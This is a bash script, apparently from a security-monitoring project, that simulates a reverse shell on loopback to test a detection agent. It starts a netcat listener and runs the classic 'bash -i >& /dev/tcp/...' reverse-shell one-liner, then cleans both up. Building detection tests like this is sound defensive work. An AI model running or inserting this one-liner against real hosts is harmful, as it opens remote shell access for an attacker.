#!/usr/bin/env bash
# =============================================================================
# reverse_shell_sim.sh — Simulates a reverse shell for detection testing
#
# Usage: ./reverse_shell_sim.sh [port] [duration_seconds]
#   port             — port to simulate the reverse shell on (default: 4444)
#   duration_seconds — how long to keep it alive for detection (default: 15)
#
# How it works:
#   1. Starts a netcat (nc) listener on the given port (background)
#   2. Spawns a bash process that connects back to it — classic reverse shell
#      pattern that the reverse_shell detector looks for
#   3. Waits for the agent to detect and log it
#   4. Cleans up both processes
#
# ⚠️  SAFE: This is local-only (127.0.0.1). No real outbound connection.
#    The agent uses /proc/net/tcp to detect it. The detection triggers even
#    for loopback if you modify STANDARD_PORTS — but by default the agent
#    filters 127.x. For a real demo, run this against a second machine IP.
#
# Expected result:
#   Agent detects bash/nc with outbound TCP on port 4444 → HIGH alert
# =============================================================================

set -euo pipefail

PORT=${1:-4444}
DURATION=${2:-15}

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║     🐚 Reverse Shell Simulation — Cyber Kavach       ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""
echo "  Port     : $PORT"
echo "  Duration : ${DURATION}s (time for agent to detect)"
echo ""

# Check nc is available
if ! command -v nc &>/dev/null; then
    echo "  ❌ 'nc' (netcat) not found. Install with: apt install netcat-openbsd"
    exit 1
fi

echo "  [1/3] Starting netcat listener on port $PORT..."
nc -lvnp "$PORT" &>/dev/null &
NC_PID=$!
echo "        nc PID: $NC_PID ✓"
sleep 1

echo "  [2/3] Spawning bash reverse shell → 127.0.0.1:$PORT..."
# This is the classic reverse shell one-liner (local-only, safe)
bash -i >& /dev/tcp/127.0.0.1/"$PORT" 0>&1 &
BASH_PID=$!
echo "        bash PID: $BASH_PID ✓"

echo ""
echo "  ⚡ Reverse shell active — agent should detect within 5 seconds"
echo "     (bash PID $BASH_PID with outbound TCP on port $PORT)"
echo ""
echo "  Keeping alive for ${DURATION}s..."
echo ""

# Count down so user can see something happening
for i in $(seq "$DURATION" -1 1); do
    printf "\r  ⏳ Cleaning up in %2ds...  " "$i"
    sleep 1
done
echo ""

echo ""
echo "  [3/3] Cleaning up..."
kill "$BASH_PID" 2>/dev/null && echo "        bash (PID $BASH_PID) killed ✓" || echo "        bash already gone"
kill "$NC_PID"   2>/dev/null && echo "        nc   (PID $NC_PID) killed ✓"   || echo "        nc already gone"

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║  ✅ Simulation complete — check dashboard for alert  ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""
echo "  Expected: HIGH severity alert"
echo "  Type    : reverse_shell"
echo "  Action  : SIMULATED_KILL (in DEMO_MODE=true)"
echo ""
